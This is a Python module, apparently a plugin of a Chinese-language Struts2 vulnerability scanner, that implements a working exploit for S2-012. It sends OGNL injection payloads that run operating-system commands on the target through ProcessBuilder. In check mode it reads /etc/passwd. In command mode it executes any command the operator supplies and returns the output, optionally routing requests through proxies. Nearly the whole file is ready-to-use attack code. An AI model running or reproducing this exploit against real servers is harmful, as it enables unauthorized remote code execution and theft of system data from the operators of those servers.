import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import random
import hashlib
import urllib

cdd=''
http = ''
https = ''
cmd=''
dq1=''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd,dq1
    global http, https,cmd
    try:
        proxies = {'http': http,
                   'https': https}
        if cmd!='':
            headers = {
                'Content-Type': "application/x-www-form-urlencoded"}
            logging.captureWarnings(True)
            poc = '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"CMD"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'
            poc1=poc.replace('CMD',cmd)
            url = urllib.parse.quote(poc1)
            data = dq1.format(exp=url)
            aa = requests.post(url1, data=data, headers=headers, proxies=proxies, verify=False, timeout=15,
                               cookies=s_cookie)
            cd = BeautifulSoup(aa.text, 'html.parser')
            cdd = cd.text.strip().strip('\xa0' * 4).replace(' ', '').replace('', '')
            cmd=''
        else:
            headers = {
                'Content-Type': "application/x-www-form-urlencoded"}
            logging.captureWarnings(True)
            poc = "%25%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B%22cat%22%2C%22/etc/passwd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D%0A"
            data=dq1.format(exp=poc)
            aa = requests.post(url1, data=data, headers=headers, proxies=proxies, verify=False, timeout=15,
                               cookies=s_cookie)
            cd = BeautifulSoup(aa.text, 'html.parser')
            ch = cd.text.strip().strip('\xa0' * 4).replace(' ', '').replace('', '')
            if 'root:/bin/bash' in cd.text:
                cdd = '[+]漏洞存在\n执行命令：cat /etc/passwd\n匹配关键词：root:/bin/bash'+ch
            else:
                cdd = '[-]漏洞不存在\nPs：可更换 \POC\自定义.txt 中的2￥后的参数值再次尝试，格式禁止更改。'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ S2-012 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
def cmad(cmd1):
    global cmd
    cmd=cmd1
def cmd12():
    global dq1
    import os
    cg=open(os.getcwd()+'\POC\自定义.txt','r',encoding='utf-8')
    while True:
        ca=cg.readline()
        if len(ca)==0:
            break
        elif '2￥' in ca:
            dq1=ca.replace('\n','').replace('2￥','')